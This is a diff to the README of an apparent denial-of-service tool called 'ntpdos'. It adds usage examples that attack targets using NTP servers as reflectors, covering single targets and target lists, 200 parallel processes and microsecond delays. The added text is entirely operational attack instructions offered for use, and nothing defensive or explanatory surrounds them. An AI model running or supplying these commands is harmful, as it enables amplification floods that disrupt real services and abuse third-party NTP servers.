@@ -26,6 +26,27 @@ misc:
   -V           - show version
   -H           - show help
 
+example:
+
+  # Attack 127.0.0.1 with servers from servers.lst
+  $ ntpdos -t 127.0.0.1 -S servers.lst
+
+  # Attack targets from targets.lst with 192.168.2.11 server
+  $ ntpdos -T targets.lst -s 192.168.2.11
+
+  # Attack targets from targets.lst with servers from servers.lst
+  $ ntpdos -T targets.lst -S servers.lst
+
+  # Attack 1.2.3.4 with 5.6.7.8 using 200 parallel processes
+  $ ntpdos -t 1.2.3.4 -s 5.6.7.8 -p 200
+
+  # Attack 1.2.3.4 with 5.6.7.8 with 1 microsec delay
+  $ ntpdos -t 1.2.3.4 -s 5.6.7.8 -d 1
+
+notes:
+
+  * list of ip addresses should have 1 ip address per line
+
 ```
 
 ## License
